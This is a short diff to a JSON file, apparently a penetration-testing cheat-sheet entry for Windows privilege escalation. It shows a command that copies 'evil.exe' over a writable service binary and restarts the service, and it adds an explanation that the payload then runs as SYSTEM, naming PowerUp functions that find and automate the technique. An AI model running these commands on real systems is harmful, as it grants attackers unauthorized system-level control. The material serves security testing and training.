@@ -123,5 +123,6 @@
       "label": "Replace the binary + restart",
       "command": "copy /y evil.exe '<service_binary_path>' ; sc stop <service> & sc start <service>"
     }
-  ]
+  ],
+  "explain": "Overwrites a service executable that is writable by your user:\n  cmd /c copy /Y payload.exe \"<writable_service_binary>\"   replace the binary (keep a copy of the original)\nRestart the service (sc stop/start) and your payload runs as the service account, usually SYSTEM. PowerUp's Get-ModifiableServiceFile finds them and Invoke-ServiceAbuse automates it."
 }
